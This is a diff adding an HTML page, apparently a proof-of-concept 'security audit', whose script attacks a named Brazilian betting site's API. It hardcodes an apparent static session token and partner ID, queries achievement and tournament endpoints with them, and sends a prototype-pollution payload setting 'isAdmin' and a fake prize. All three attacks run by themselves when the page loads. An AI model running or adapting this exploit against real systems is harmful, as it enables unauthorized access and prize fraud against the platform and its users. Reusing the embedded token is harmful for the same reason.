@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>R7 Security Audit</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <h1>Vulnerabilidade Demonstrada</h1>
+    <div id="result"></div>
+
+    <script>
+        // Configurações de exploração
+        const BASE_URL = "https://spider.r7.bet.br";
+        const STATIC_TOKEN = "867686a7848bfa3f3a263998f6a81";
+        const PARTNER_ID = "18760969";
+
+        // Exploração 1: Sequência de autenticação
+        async function exploitAuth() {
+            try {
+                const response = await axios.post(
+                    `${BASE_URL}/Achievement/pt/GetGameAchievementList`,
+                    {
+                        PartnerId: PARTNER_ID,
+                        StageList: [1, 2, 3],
+                        SourceId: 7,
+                        IncludeAwardSummaryInfo: true,
+                        LangId: "pt",
+                        SessionToken: STATIC_TOKEN,
+                        CurrencyId: "BRL"
+                    },
+                    {
+                        headers: {
+                            "Authentication": STATIC_TOKEN,
+                            "Content-Type": "application/json;charset=UTF-8"
+                        }
+                    }
+                );
+                
+                document.getElementById("result").innerHTML += 
+                    `<h2>Dados de Jogo Expostos:</h2><pre>${JSON.stringify(response.data, null, 2)}</pre>`;
+                
+                return response.data;
+                
+            } catch (error) {
+                console.error("Erro na exploração:", error);
+            }
+        }
+
+        // Exploração 2: Manipulação de torneios
+        async function manipulateTournaments() {
+            try {
+                const response = await axios.post(
+                    `${BASE_URL}/Tournament/GetPlayerAvailableTournamentsByGame`,
+                    {
+                        PartnerId: PARTNER_ID,
+                        GameId: "426639563", // ID injetável
+                        LangId: "pt",
+                        SessionToken: STATIC_TOKEN
+                    },
+                    {
+                        headers: {
+                            "Authentication": STATIC_TOKEN,
+                            "Content-Type": "application/json;charset=UTF-8"
+                        }
+                    }
+                );
+                
+                document.getElementById("result").innerHTML += 
+                    `<h2>Torneios Manipulados:</h2><pre>${JSON.stringify(response.data, null, 2)}</pre>`;
+                
+                return response.data;
+                
+            } catch (error) {
+                console.error("Erro na manipulação:", error);
+            }
+        }
+
+        // Exploração 3: Injeção de prêmios
+        async function prizeInjection() {
+            try {
+                const maliciousPayload = {
+                    PartnerId: PARTNER_ID,
+                    SessionToken: STATIC_TOKEN,
+                    // Payload de injeção
+                    AwardSummary: {
+                        __proto__: {
+                            isAdmin: true,
+                            fakePrize: 99999
+                        }
+                    }
+                };
+
+                const response = await axios.post(
+                    `${BASE_URL}/Promotion/GetPlayerSession`,
+                    maliciousPayload,
+                    {
+                        headers: {
+                            "Authentication": STATIC_TOKEN,
+                            "Content-Type": "application/json;charset=UTF-8"
+                        }
+                    }
+                );
+                
+                document.getElementById("result").innerHTML += 
+                    `<h2>Prêmios Injetados:</h2><pre>${JSON.stringify(response.data, null, 2)}</pre>`;
+                
+                return response.data;
+                
+            } catch (error) {
+                console.error("Erro na injeção:", error);
+            }
+        }
+
+        // Executar explorações
+        (async () => {
+            await exploitAuth();
+            await manipulateTournaments();
+            await prizeInjection();
+        })();
+    </script>
+</body>
+</html>
